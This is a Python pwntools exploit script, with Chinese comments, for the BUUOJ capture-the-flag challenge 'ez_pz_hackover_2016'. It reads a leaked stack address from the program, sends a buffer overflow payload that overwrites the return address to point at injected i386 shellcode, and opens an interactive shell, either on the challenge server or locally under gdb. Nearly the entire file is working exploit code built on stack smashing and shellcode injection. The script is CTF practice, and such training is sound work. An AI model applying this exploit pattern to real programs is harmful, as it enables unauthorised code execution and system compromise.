'''
@Author       : 白银
@Date         : 2023-04-28 09:35:28
@LastEditors  : 白银
@LastEditTime : 2023-04-28 15:18:40
@FilePath     : /pwn/ez_pz_hackover_2016.py
@Description  : https://buuoj.cn/challenges#ez_pz_hackover_2016
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
# from libcfind import *

set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './ez_pz_hackover_2016'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 27848)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

io.recvuntil('Yippie, lets crash: ')
s_addr = int(io.recvuntil('\n'), 16) # 程序会把s的地址带出来

payload1 = flat([asm(shellcraft.sh())])
payload = flat([b'crashme\x00'.ljust(0x16 + 0x4, b'\x00'), (s_addr-0x1c), payload1])
io.sendline(payload)

io.interactive()